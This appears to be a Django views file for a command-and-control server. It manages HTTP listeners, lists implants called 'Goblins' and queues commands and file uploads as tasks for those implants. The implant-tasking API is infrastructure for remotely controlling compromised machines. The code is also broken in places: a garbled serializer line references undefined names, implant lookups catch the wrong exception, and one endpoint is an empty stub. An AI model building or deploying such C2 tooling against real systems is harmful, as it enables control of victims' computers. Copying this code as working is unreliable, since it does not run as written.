from rest_framework.views import APIView
from django.views.generic import View
from rest_framework.response import Response
from rest_framework import status
from django.http import JsonResponse
from .serializers import HttpListenerSerializer, GoblinSerializer, GoblinTaskSerializer, GoblinRawTaskSerializer
from .models import HttpListener, Goblin, GoblinTask
from .services import HttpListenerManager, CommandHandler
from drf_yasg.utils import swagger_auto_schema
from drf_yasg import openapi
from .utils import is_port_available
from rest_framework.parsers import MultiPartParser, FormParser

class ListenerView(APIView):
    @swagger_auto_schema(
        request_body=HttpListenerSerializer,
        responses={200: HttpListenerSerializer()},
        operation_description="Create a HTTP listener"
    )
    def post(self, request):
        serializer = HttpListenerSerializer(data=request.data)
        if serializer.is_valid():
            name = serializer.validated_data.get('name')
            port = serializer.validated_data.get('port')

            if not name or not port:
                return JsonResponse({'error': 'Name and port must be provided'}, status=400)

            try:
                port = int(port)
            except ValueError:
                return JsonResponse({'error': 'Port must be an integer'}, status=400)

            if not is_port_available(port):
                return JsonResponse({'error': f'Port {port} is already in use.'}, status=400)

            listener = HttpListener(name=name, port=port)
            listener.save()
            HttpListenerManager.start_listener(listener)
            return JsonResponse({'message': f'Listener {listener.id} on port {port} started successfully.'}, status=201)
        else:
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    def get(self, request):
        listeners = HttpListener.objects.all()
        serializer = HttpListenerSerializer(listeners, many=True)
        return JsonResponse({'listeners': serializer.data})

class ListenerDetailView(APIView):
    @swagger_auto_schema(
        manual_parameters=[
            openapi.Parameter(
                'id', in_=openapi.IN_PATH, type=openapi.TYPE_INTEGER, description='Listener ID', required=True
            )
        ],
        responses={
            200: "HTTP listener deleted successfully",
            404: "Listener not found"
        },
        operation_description="Get a HTTP listener"
    )
    def get(self, request, id):
        try:
            listener = HttpListener.objects.get(id=id)
            serializer = HttpListenerSerializer(listener)
            return JsonResponse({'listener': serializer.data})
        except:
            return JsonResponse({'error': 'Listener not found'}, status=404)    
    
    @swagger_auto_schema(
    manual_parameters=[
        openapi.Parameter(
            'id', in_=openapi.IN_PATH, type=openapi.TYPE_INTEGER, description='Listener ID', required=True
        )
    ],
    responses={
        200: "HTTP listener deleted successfully",
        404: "Listener not found"
    },
    operation_description="Delete a HTTP listener"
    )
    def delete(self, request, id):
        try:
            listener = HttpListener.objects.get(id=id)
            HttpListenerManager.stop_listener(listener)
            listener.delete()
            return JsonResponse({'message': 'Listener deleted successfully'})
        except HttpListener.DoesNotExist:
            return JsonResponse({'error': 'Listener not found'}, status=404)

class ImplantsView(APIView):
    def get(self, request):
        implants = Goblin.objects.all()
        serializer = GoblinSerializer(implants, many=True)
        return JsonResponse({'implants': serializer.data})

class ImplantsDetailView(APIView):
    @swagger_auto_schema(
        manual_parameters=[
            openapi.Parameter(
                'id', in_=openapi.IN_PATH, type=openapi.TYPE_INTEGER, description='Implant ID', required=True
            )
        ],
        responses={
            200: GoblinSerializer(),
            404: "Implant not found"
        },
        operation_description="Get an Implant by ID"
    )
    def get(self, request, id):
        try:
            implant = Goblin.objects.get(id=id)
            serializer = GoblinSerializer(implant)
            return JsonResponse({'implant': serializer.data})
        except HttpListener.DoesNotExist:
            return JsonResponse({'error': 'Implant not found'}, status=status.HTTP_404_NOT_FOUND)

class ImplantsTaskView(APIView):
    def get(self, request, id):
        try:
            implant = Goblin.objects.get(id=id)
            Gserializer = oblinSerializer(implant)
            return JsonResponse({'tasks': serializer.data.get('tasks')})
        except HttpListener.DoesNotExist:
            return JsonResponse({'error': 'Implant not found'}, status=status.HTTP_404_NOT_FOUND)
    
    @swagger_auto_schema(
        request_body=GoblinRawTaskSerializer,
        responses={200: GoblinRawTaskSerializer()},
        operation_description="Send a Task to a goblin"
    )
    def post(self, request, id):
        serializer = GoblinRawTaskSerializer(data=request.data)
        if serializer.is_valid():
            raw_command = serializer.validated_data.get('command')
            try:
                command, arguments, file = CommandHandler.parse(raw_command)
            except ValueError as e:
                return Response({'error': str(e)}, status=status.HTTP_400_BAD_REQUEST)

            task = GoblinTask(command=command, arguments=arguments, file=file, is_pending=True)
            task.save()
            try:
                print(id)
                goblin = Goblin.objects.get(id=id)
                goblin.tasks.add(task)
                goblin.save()
            except:
                return Response({'error': 'Goblin not found'}, status=status.HTTP_404_NOT_FOUND)
                
    
            return JsonResponse({'message': f'Tasked Goblin to go on mission'}, status=201)
        else:
            return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

class ArmoryView(APIView):

    parser_classes = (MultiPartParser,)
    @swagger_auto_schema(
         manual_parameters=[
            openapi.Parameter('command', in_=openapi.IN_FORM, type=openapi.TYPE_STRING, description="Command for the Goblin"),
            openapi.Parameter('arguments', in_=openapi.IN_FORM, type=openapi.TYPE_STRING, description="Arguments for the command"),
            openapi.Parameter('file', in_=openapi.IN_FORM, type=openapi.TYPE_FILE, description="Upload file")
        ],
        responses={201: GoblinTaskSerializer()},
        operation_description="Task a goblin",
        consumes=['multipart/form-data']
    )
    def post(self, request):
        pass

from django.shortcuts import render

class UIListenersView(View):
    def get(self, request):
        return render(request, 'listeners.html')

class UIImplantsView(View):
    def get(self, request):
        return render(request, 'implants.html')
